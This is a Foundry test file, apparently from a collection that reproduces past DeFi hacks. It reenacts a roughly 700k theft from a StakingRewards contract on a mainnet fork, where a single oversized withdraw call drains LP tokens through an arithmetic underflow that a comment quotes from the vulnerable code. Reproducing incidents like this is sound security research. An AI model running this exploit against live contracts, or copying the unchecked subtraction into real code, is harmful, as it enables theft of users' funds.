// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 700k
// Attacker : 0x1751e3e1aaf1a3e7b973c889b7531f43fc59f7d0
// AttackContract : 0x89767960b76b009416bc7ff4a4b79051eed0a9ee
// StakingRewards contract: 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE
// Attack TX: https://etherscan.io/tx/0x33479bcfbc792aa0f8103ab0d7a3784788b5b0e1467c81ffbed1b7682660b4fa
// Attack TX: https://bscscan.com/tx/0x784b68dc7d06ee181f3127d5eb5331850b5e690cc63dd099cd7b8dc863204bf6

interface IStakingRewards {
    function withdraw(uint256 amount) external;
}

contract AttackContract is Test {
    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IStakingRewards constant StakingRewards = IStakingRewards(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE);
    IERC20 constant uniLP = IERC20(0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042);

    function setUp() public {
        cheat.createSelectFork("mainnet", 14_421_983); // Fork mainnet at block 14421983
    }

    function testExploit() public {
        emit log_named_decimal_uint("Before exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);

        StakingRewards.withdraw(8_792_873_290_680_252_648_282); //without putting any crypto, we can drain out the LP tokens in uniswap pool by underflow.

        /*
        StakingRewards contract, vulnerable code snippet.
    function _withdraw(uint256 amount, address user, address recipient) internal nonReentrant updateReward(user) {
        require(amount != 0, "Cannot withdraw 0");

        // not using safe math, because there is no way to overflow if stake tokens not overflow
        _totalSupply = _totalSupply - amount;
        _balances[user] = _balances[user] - amount;   //<---- underflow here.
        */
        emit log_named_decimal_uint("After exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);
    }
}
